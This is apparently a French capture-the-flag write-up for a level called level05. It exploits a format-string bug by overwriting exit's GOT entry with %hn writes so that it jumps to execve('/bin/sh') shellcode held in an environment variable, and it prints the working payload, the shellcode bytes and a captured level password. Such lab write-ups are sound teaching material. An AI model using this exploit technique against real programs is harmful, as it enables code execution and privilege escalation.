On ne peut pas faire d'overflow ici, donc on ne pourra pas réutiliser les techniques du level01 et level04.

On va donc voir si il est possible d'écrire un shellcode.

En écrivant: "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p" en argument, on peut voir qu'à la dixième position,
les adresses mémoires listées sont les caractères de notre argument et nons plus de la donnée en mémoire.

On peut alors penser qu'il est possible d'écrire un shellcode à partir de cette position.
On peut en trouver un exemple qu'on va réutiliser sur le site: http://shell-storm.org/shellcode/files/shellcode-827.php

On va trouver un exemple de shellcode, des instructions en langage machine qui vont executer la fonction execve("/bin/sh"),
nous permettant de traiter des commandes et de lire le fichier de mot de passe.

Notre programme n'a pas accès à l'environnement.
On va donc devoir le rediriger vers l'adresse de notre shellcode à travers exit, plus particulirement son PLT (Procedure Linkage Table)
Le PLT est l'endroit où est stocké la fonction avant que celle ci ne dynamiquement allouée dans la fonction.

Ainsi en utilisant le PLT, on va pouvoir rediriger l'appel de la fonction exit vers notre shellcode en écrasant l'adresse
Pour avoir l'adresse de exit:
objdump -R level05
080497e0
Pour avoir l'adresse du shellcode:
(gdb) x/s *((char **)environ)

0xffffd878

ffff = 65535
d878 = 55416

65535 - 55416 = 10119

on va écrire notre adresse en 2 bytes, on retire 8 bits pour les 4 * 2 bytes de l'adresse qu'on va écrire dans notre commande
Pour ecrire sur ces deux bytes, on va utiliser 2 shorts, grace au flag $hn, ou notre adresse en hexa sera ecrite sur ces deux bytes.

export SHELLCODE=`python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55408d%10$hn" + "%10119d%11$hn")') > /tmp/level05
cat /tmp/level05 - | ./level05
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

Explications:
\x90 est un NOP slide: il permet d'aller à l'instruction suivante

================================================
Source: 
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html
https://tiwim.github.io/pages/formatstring.html